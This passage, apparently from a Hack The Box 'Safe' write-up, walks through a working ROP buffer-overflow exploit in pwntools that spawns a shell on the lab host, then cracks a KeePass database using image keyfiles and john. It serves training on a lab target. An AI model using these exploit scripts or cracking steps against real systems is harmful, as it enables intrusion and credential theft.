<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x0
RBX: 0x0
RCX: 0x7fe282a25f33 <span class="o">(</span>&lt;__GI___libc_write+19&gt;:    cmp    rax,0xfffffffffffff000<span class="o">)</span>
RDX: 0x0
RSI: 0xe512a0 <span class="o">(</span><span class="s2">"What do you want me to echo back? "</span>, <span class="s1">'A'</span> &lt;repeats 112 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"/bin/sh</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
RDI: 0x7fe282af8670 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x68732f6e69622f <span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="calling-system">Calling system()</h1>

<p>To call system(), I need to write <code class="language-plaintext highlighter-rouge">r13</code> memory with system address. 
For that, I need to find a ROP gadget which contains popping <code class="language-plaintext highlighter-rouge">r13</code>. (The POP instruction reads a byte from the address indirectly referenced by the SP register.)</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">ret</code> == <code class="language-plaintext highlighter-rouge">pop rip</code>. If <code class="language-plaintext highlighter-rouge">rsp</code> contains <code class="language-plaintext highlighter-rouge">pop r13</code> address, thatâ€™ll go to <code class="language-plaintext highlighter-rouge">rip</code> and the following instructions will be executed.</li>
  <li><code class="language-plaintext highlighter-rouge">rip</code> now contains <code class="language-plaintext highlighter-rouge">pop r13</code> instruction. If the <code class="language-plaintext highlighter-rouge">rsp</code> now contains system() address, thatâ€™ll go to <code class="language-plaintext highlighter-rouge">r13</code> register.</li>
  <li>Then we can jump to <code class="language-plaintext highlighter-rouge">r13</code> which has system address and itâ€™ll take the params from <code class="language-plaintext highlighter-rouge">rbp</code> which contains <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code>
Which means we need to write system address just after  <code class="language-plaintext highlighter-rouge">offset(112) + shell(8) + pop gadget</code>.</li>
</ul>

<h2 id="finding-pop-r13-gadget">Finding <code class="language-plaintext highlighter-rouge">pop r13</code> gadget:</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'./myapp'</span><span class="p">,</span><span class="s">'''
set follow-fork-mode parent
ropsearch "pop r13"
'''</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>gdb gives us:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>Searching <span class="k">for </span>ROP gadget: <span class="s1">'pop r13'</span> <span class="k">in</span>: binary ranges
0x00401206 : <span class="o">(</span>b<span class="s1">'415d415e415fc3'</span><span class="o">)</span>        pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="using-the-gadget">Using the gadget</h1>

<p><code class="language-plaintext highlighter-rouge">0x00401206</code> contains <code class="language-plaintext highlighter-rouge">pop r13</code>, but also <code class="language-plaintext highlighter-rouge">pop r14</code>, <code class="language-plaintext highlighter-rouge">pop r15</code> and then <code class="language-plaintext highlighter-rouge">ret</code>.
We can give system for r13 and nullâ€™s for r14 and r15. 
Letâ€™s first find systemâ€™s address:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>info functions
Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  <span class="nb">printf</span>@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  <span class="nb">test
</span>0x000000000040115f  main
0x00000000004011b0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401214  _fini
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We get <code class="language-plaintext highlighter-rouge">0x401040</code> as system() address. (You can also give <code class="language-plaintext highlighter-rouge">0x40116e</code> which is call system in main, which eventually uses system@plt)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td> --><td class="rouge-code"><pre><span class="c">#!/usr/bin/python3</span>
from pwn import <span class="k">*</span>

p <span class="o">=</span> gdb.debug<span class="o">(</span><span class="s1">'./myapp'</span>,<span class="s1">'''
set follow-fork-mode parent
'''</span><span class="o">)</span>

junk <span class="o">=(</span><span class="s2">"A"</span><span class="k">*</span> 112<span class="o">)</span>.encode<span class="o">()</span>
shell <span class="o">=</span> <span class="s2">"/bin/sh</span><span class="se">\x</span><span class="s2">00"</span>.encode<span class="o">()</span>
pop_r13 <span class="o">=</span> p64<span class="o">(</span>0x401206<span class="o">)</span>
system <span class="o">=</span> p64<span class="o">(</span>0x401040<span class="o">)</span>
null <span class="o">=</span> p64<span class="o">(</span>0x0<span class="o">)</span>

p.sendline<span class="o">(</span>junk + shell + pop_r13 + system + null + null<span class="o">)</span>
p.interactive<span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Letâ€™s run that:</p>
<ul>
  <li>This is when <code class="language-plaintext highlighter-rouge">rip</code> reaches <code class="language-plaintext highlighter-rouge">ret</code> instruction in main:</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>c
Continuing.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x0
RBX: 0x0
RCX: 0x7f6d94b04f33 <span class="o">(</span>&lt;__GI___libc_write+19&gt;:    cmp    rax,0xfffffffffffff000<span class="o">)</span>
RDX: 0x0
RSI: 0xf672a0 <span class="o">(</span><span class="s2">"What do you want me to echo back? "</span>, <span class="s1">'A'</span> &lt;repeats 112 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"/bin/sh</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
RDI: 0x7f6d94bd7670 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x68732f6e69622f <span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>
RSP: 0x7ffd3143a7f8 <span class="nt">--</span><span class="o">&gt;</span> 0x401206 <span class="o">(</span>&lt;__libc_csu_init+86&gt;: pop    r13<span class="o">)</span>
RIP: 0x4011ac <span class="o">(</span>&lt;main+77&gt;:       ret<span class="o">)</span>
R8 : 0x78 <span class="o">(</span><span class="s1">'x'</span><span class="o">)</span>
R9 : 0x0
R10: 0xfffffffffffff28e
R11: 0x246
R12: 0x401070 <span class="o">(</span>&lt;_start&gt;:        xor    ebp,ebp<span class="o">)</span>
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x4011a1 &lt;main+66&gt;:  call   0x401030 &lt;puts@plt&gt;
   0x4011a6 &lt;main+71&gt;:  mov    eax,0x0
   0x4011ab &lt;main+76&gt;:  leave
<span class="o">=&gt;</span> 0x4011ac &lt;main+77&gt;:  ret
   0x4011ad:    nop    DWORD PTR <span class="o">[</span>rax]
   0x4011b0 &lt;__libc_csu_init&gt;:  push   r15
   0x4011b2 &lt;__libc_csu_init+2&gt;:        mov    r15,rdx
   0x4011b5 &lt;__libc_csu_init+5&gt;:        push   r14
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7ffd3143a7f8 <span class="nt">--</span><span class="o">&gt;</span> 0x401206 <span class="o">(</span>&lt;__libc_csu_init+86&gt;:        pop    r13<span class="o">)</span>
0008| 0x7ffd3143a800 <span class="nt">--</span><span class="o">&gt;</span> 0x40116e <span class="o">(</span>&lt;main+15&gt;:   call   0x401040 &lt;system@plt&gt;<span class="o">)</span>
0016| 0x7ffd3143a808 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0x7ffd3143a810 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0032| 0x7ffd3143a818 <span class="nt">--</span><span class="o">&gt;</span> 0x7f6d94a3c700 <span class="o">(</span>&lt;init_cacheinfo+80&gt;:   sub    ecx,DWORD PTR <span class="o">[</span>rcx+rcx<span class="k">*</span>4-0x20]<span class="o">)</span>
0040| 0x7ffd3143a820 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0048| 0x7ffd3143a828 <span class="nt">--</span><span class="o">&gt;</span> 0x76165f7cf4ad4fc4
0056| 0x7ffd3143a830 <span class="nt">--</span><span class="o">&gt;</span> 0x401070 <span class="o">(</span>&lt;_start&gt;:    xor    ebp,ebp<span class="o">)</span>
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Breakpoint 4, 0x00000000004011ac <span class="k">in </span>main <span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Taking one step more, as we want <code class="language-plaintext highlighter-rouge">pop r13</code> goes to <code class="language-plaintext highlighter-rouge">rip</code> as <code class="language-plaintext highlighter-rouge">ret == pop rip</code>, we can see <code class="language-plaintext highlighter-rouge">system</code> address at <code class="language-plaintext highlighter-rouge">rsp</code>,, and <code class="language-plaintext highlighter-rouge">/bin/sh</code> at <code class="language-plaintext highlighter-rouge">rbp</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>si
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x0
RBX: 0x0
RCX: 0x7f6d94b04f33 <span class="o">(</span>&lt;__GI___libc_write+19&gt;:    cmp    rax,0xfffffffffffff000<span class="o">)</span>
RDX: 0x0
RSI: 0xf672a0 <span class="o">(</span><span class="s2">"What do you want me to echo back? "</span>, <span class="s1">'A'</span> &lt;repeats 112 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"/bin/sh</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
RDI: 0x7f6d94bd7670 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x68732f6e69622f <span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>
RSP: 0x7ffd3143a800 <span class="nt">--</span><span class="o">&gt;</span> 0x40116e <span class="o">(</span>&lt;main+15&gt;:    call   0x401040 &lt;system@plt&gt;<span class="o">)</span>
RIP: 0x401206 <span class="o">(</span>&lt;__libc_csu_init+86&gt;:    pop    r13<span class="o">)</span>
R8 : 0x78 <span class="o">(</span><span class="s1">'x'</span><span class="o">)</span>
R9 : 0x0
R10: 0xfffffffffffff28e
R11: 0x246
R12: 0x401070 <span class="o">(</span>&lt;_start&gt;:        xor    ebp,ebp<span class="o">)</span>
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x401202 &lt;__libc_csu_init+82&gt;:       pop    rbx
   0x401203 &lt;__libc_csu_init+83&gt;:       pop    rbp
   0x401204 &lt;__libc_csu_init+84&gt;:       pop    r12
<span class="o">=&gt;</span> 0x401206 &lt;__libc_csu_init+86&gt;:       pop    r13
   0x401208 &lt;__libc_csu_init+88&gt;:       pop    r14
   0x40120a &lt;__libc_csu_init+90&gt;:       pop    r15
   0x40120c &lt;__libc_csu_init+92&gt;:       ret
   0x40120d:    nop    DWORD PTR <span class="o">[</span>rax]
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7ffd3143a800 <span class="nt">--</span><span class="o">&gt;</span> 0x40116e <span class="o">(</span>&lt;main+15&gt;:   call   0x401040 &lt;system@plt&gt;<span class="o">)</span>
0008| 0x7ffd3143a808 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0016| 0x7ffd3143a810 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0024| 0x7ffd3143a818 <span class="nt">--</span><span class="o">&gt;</span> 0x7f6d94a3c700 <span class="o">(</span>&lt;init_cacheinfo+80&gt;:   sub    ecx,DWORD PTR <span class="o">[</span>rcx+rcx<span class="k">*</span>4-0x20]<span class="o">)</span>
0032| 0x7ffd3143a820 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0040| 0x7ffd3143a828 <span class="nt">--</span><span class="o">&gt;</span> 0x76165f7cf4ad4fc4
0048| 0x7ffd3143a830 <span class="nt">--</span><span class="o">&gt;</span> 0x401070 <span class="o">(</span>&lt;_start&gt;:    xor    ebp,ebp<span class="o">)</span>
0056| 0x7ffd3143a838 <span class="nt">--</span><span class="o">&gt;</span> 0x0
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
0x0000000000401206 <span class="k">in </span>__libc_csu_init <span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<ul>
  <li>This is when <code class="language-plaintext highlighter-rouge">pop r13; pop r14; pop r15</code> are done and <code class="language-plaintext highlighter-rouge">ret</code> is reached. But it doesnâ€™t know where to return to and hence gives <code class="language-plaintext highlighter-rouge">Segmentation fault</code>. Stack is again messed up. We didnâ€™t call function test() which puts value in <code class="language-plaintext highlighter-rouge">rbp</code> to <code class="language-plaintext highlighter-rouge">rdi</code> and then thereâ€™s a jump at <code class="language-plaintext highlighter-rouge">r13</code> which takes param from <code class="language-plaintext highlighter-rouge">rdi</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
RAX: 0x0
RBX: 0x0
RCX: 0x7f6d94b04f33 <span class="o">(</span>&lt;__GI___libc_write+19&gt;:    cmp    rax,0xfffffffffffff000<span class="o">)</span>
RDX: 0x0
RSI: 0xf672a0 <span class="o">(</span><span class="s2">"What do you want me to echo back? "</span>, <span class="s1">'A'</span> &lt;repeats 112 <span class="nb">times</span><span class="o">&gt;</span>, <span class="s2">"/bin/sh</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
RDI: 0x7f6d94bd7670 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RBP: 0x68732f6e69622f <span class="o">(</span><span class="s1">'/bin/sh'</span><span class="o">)</span>
RSP: 0x7ffd3143a820 <span class="nt">--</span><span class="o">&gt;</span> 0x0
RIP: 0x7f6d94a3c700 <span class="o">(</span>&lt;init_cacheinfo+80&gt;:       sub    ecx,DWORD PTR <span class="o">[</span>rcx+rcx<span class="k">*</span>4-0x20]<span class="o">)</span>
R8 : 0x78 <span class="o">(</span><span class="s1">'x'</span><span class="o">)</span>
R9 : 0x0
R10: 0xfffffffffffff28e
R11: 0x246
R12: 0x401070 <span class="o">(</span>&lt;_start&gt;:        xor    ebp,ebp<span class="o">)</span>
R13: 0x40116e <span class="o">(</span>&lt;main+15&gt;:       call   0x401040 &lt;system@plt&gt;<span class="o">)</span>
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
<span class="o">=&gt;</span> 0x7f6d94a3c700 &lt;init_cacheinfo+80&gt;:  sub    ecx,DWORD PTR <span class="o">[</span>rcx+rcx<span class="k">*</span>4-0x20]
   0x7f6d94a3c704 &lt;init_cacheinfo+84&gt;:  mov    QWORD PTR <span class="o">[</span>rip+0x197c0d],r12        <span class="c"># 0x7f6d94bd4318 &lt;__x86_raw_data_cache_size&gt;</span>
   0x7f6d94a3c70b &lt;init_cacheinfo+91&gt;:  xor    r12b,r12b
   0x7f6d94a3c70e &lt;init_cacheinfo+94&gt;:  sar    rax,1
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0x7ffd3143a820 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0008| 0x7ffd3143a828 <span class="nt">--</span><span class="o">&gt;</span> 0x76165f7cf4ad4fc4
0016| 0x7ffd3143a830 <span class="nt">--</span><span class="o">&gt;</span> 0x401070 <span class="o">(</span>&lt;_start&gt;:    xor    ebp,ebp<span class="o">)</span>
0024| 0x7ffd3143a838 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0032| 0x7ffd3143a840 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0040| 0x7ffd3143a848 <span class="nt">--</span><span class="o">&gt;</span> 0x0
0048| 0x7ffd3143a850 <span class="nt">--</span><span class="o">&gt;</span> 0x89ec3d7b87cd4fc4
0056| 0x7ffd3143a858 <span class="nt">--</span><span class="o">&gt;</span> 0x88cd76bb4e4b4fc4
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00007f6d94a3c700 <span class="k">in </span>init_cacheinfo <span class="o">()</span> at ../sysdeps/x86/cacheinfo.c:772
772     ../sysdeps/x86/cacheinfo.c: No such file or directory.
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="calling-test">Calling test()</h1>

<p>Finding the address for test():</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td> --><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  <span class="nb">printf</span>@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  <span class="nb">test
</span>0x000000000040115f  main
0x00000000004011b0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401214  _fini
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We get <code class="language-plaintext highlighter-rouge">0x401152</code> for test()</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td> --><td class="rouge-code"><pre><span class="c">#!/usr/bin/python3</span>
from pwn import <span class="k">*</span>

p <span class="o">=</span> gdb.debug<span class="o">(</span><span class="s1">'./myapp'</span>,<span class="s1">'''
set follow-fork-mode parent
'''</span><span class="o">)</span>

junk <span class="o">=(</span><span class="s2">"A"</span><span class="k">*</span> 112<span class="o">)</span>.encode<span class="o">()</span>
shell <span class="o">=</span> <span class="s2">"/bin/sh</span><span class="se">\x</span><span class="s2">00"</span>.encode<span class="o">()</span>
pop_r13 <span class="o">=</span> p64<span class="o">(</span>0x401206<span class="o">)</span>
system <span class="o">=</span> p64<span class="o">(</span>0x401040<span class="o">)</span>
null <span class="o">=</span> p64<span class="o">(</span>0x0<span class="o">)</span>
<span class="nb">test</span> <span class="o">=</span> p64<span class="o">(</span>0x401152<span class="o">)</span>

<span class="c">#p.recvuntil('What do you want me to echo back?')</span>
p.sendline<span class="o">(</span>junk + shell + pop_r13 + system + null + null + <span class="nb">test</span><span class="o">)</span>
p.interactive<span class="o">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Running the script, we get a shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre>root@TheCaretaker:~/HTB/Safe# python3 scripts/temp.py
<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'/usr/bin/gdbserver'</span>: pid 217925
<span class="o">[</span><span class="k">*</span><span class="o">]</span> running <span class="k">in </span>new terminal: /usr/bin/gdb <span class="nt">-q</span>  <span class="s2">"./myapp"</span> <span class="nt">-x</span> /tmp/pwnoux9jrgh.gdb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
Detaching from process 217962
 16:23:01 up 1 day, 20:56,  8 <span class="nb">users</span>,  load average: 0.23, 0.22, 0.24

What <span class="k">do </span>you want me to <span class="nb">echo </span>back? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh
Detaching from process 217964
<span class="nv">$ </span><span class="nb">whoami
</span>root
<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you still donâ€™t get a shell try doing a recvuntil() for the gets message, which Iâ€™ve commented.</p>

<h1 id="sending-payload-to-safehtb">Sending payload to safe.htb</h1>

<p>Letâ€™s change the gdb debug myapp part to connecting to safe.htb at port 1337:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td> --><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#p = gdb.debug('./myapp')
</span><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'safe.htb'</span><span class="p">,</span><span class="mi">1337</span><span class="p">)</span>

<span class="n">junk</span> <span class="o">=</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span> <span class="mi">112</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
<span class="n">shell</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">pop_r13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401040</span><span class="p">)</span>
<span class="n">null</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
<span class="n">test</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span>

<span class="c1">#p.recvuntil('What do you want me to echo back?')
</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">shell</span> <span class="o">+</span> <span class="n">pop_r13</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="n">null</span> <span class="o">+</span> <span class="n">null</span> <span class="o">+</span> <span class="n">test</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And we get a shell:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre>root@TheCaretaker:~/HTB/Safe# python3 scripts/temp.py
<span class="o">[</span>+] Opening connection to safe.htb on port 1337: Done
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
 07:02:51 up 0 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
<span class="nv">$ </span><span class="nb">whoami
</span>user
<span class="nv">$ </span><span class="nb">cat</span> /home/user/user.txt
7a29ee9b0fa17ac013d4bf01fd127690
<span class="err">$</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h1 id="privesc-with-keepass">Privesc with keepass</h1>

<p>Listing contents of home directory, I see 6 images and a <code class="language-plaintext highlighter-rouge">keepass</code> password database file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls
</span>IMG_0545.JPG
IMG_0546.JPG
IMG_0547.JPG
IMG_0548.JPG
IMG_0552.JPG
IMG_0553.JPG
myapp
MyPasswords.kdbx
user.txt
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can crack the keepass database file with john but letâ€™s see why those images are given. 
<code class="language-plaintext highlighter-rouge">keepass</code> offers functionality of specifying a keyfile:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>keepass2john
Usage: keepass2john <span class="o">[</span><span class="nt">-k</span> &lt;keyfile&gt;] &lt;.kdbx database<span class="o">(</span>s<span class="o">)&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We can specify every image as a keyfile and use <code class="language-plaintext highlighter-rouge">keepass2john</code> to generate hashes:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">ls </span>IMG<span class="k">*</span>.JPG<span class="si">)</span><span class="p">;</span><span class="k">do </span>keepass2john <span class="nt">-k</span> <span class="nv">$i</span> MyPasswords.kdbx <span class="o">&gt;&gt;</span> hashes<span class="p">;</span> <span class="k">done</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Then cracking with <code class="language-plaintext highlighter-rouge">john</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre><span class="nv">$ </span>john hashes <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts <span class="o">(</span>KeePass <span class="o">[</span>SHA256 AES 32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 60000 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span>version<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
Cost 3 <span class="o">(</span>algorithm <span class="o">[</span><span class="nv">0</span><span class="o">=</span>AES, <span class="nv">1</span><span class="o">=</span>TwoFish, <span class="nv">2</span><span class="o">=</span>ChaCha]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
bullshit         <span class="o">(</span>MyPasswords<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">kpcli</code> is a tool to view keepass database in cmdline, you can even use <code class="language-plaintext highlighter-rouge">keepassx</code> for a gui mode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
